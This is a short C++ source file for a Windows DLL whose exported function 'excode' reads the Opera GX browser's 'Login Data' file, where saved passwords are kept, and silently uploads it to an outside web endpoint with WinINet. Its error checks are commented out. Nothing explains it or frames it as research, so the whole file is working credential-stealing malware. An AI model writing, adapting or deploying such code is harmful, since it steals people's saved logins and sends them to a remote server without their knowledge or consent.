#include <Windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

extern "C" __declspec(dllexport) void excode() {
	const wchar_t* filePath = L"C:\\Users\\Administrator\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
	const wchar_t* apiUrl = L"https://www.picoshot.net/apis/uploadfile_api.php";

	std::ifstream fileStream(filePath, std::ios::binary);
	if(!fileStream)
	{
		//throw std::runtime_error("faild to open file");
	}

	fileStream.seekg(0, std::ios::end);
	int fileSize = static_cast<int>(fileStream.tellg());
	fileStream.seekg(0, std::ios::beg);


	char* buffer = new char[fileSize];
	fileStream.read(buffer, fileSize);

	HINTERNET hInternet = InternetOpenW(L"Uploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL,0);

	if(hInternet == NULL)
	{
		//throw std::runtime_error("Faild to setup connection");
	}

	HINTERNET hConnect = InternetOpenUrlW(hInternet, apiUrl, NULL, 0, INTERNET_FLAG_RELOAD, 0);

	if(hConnect == NULL)
	{
		//throw std::runtime_error("Faild to connect");
	}

	if(!HttpSendRequestA(hConnect, "Content-Type: application/octet-stream", -1,buffer,fileSize))
	{
		//throw std::runtime_error("Faild to upload");
	}


	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	delete[] buffer;


}
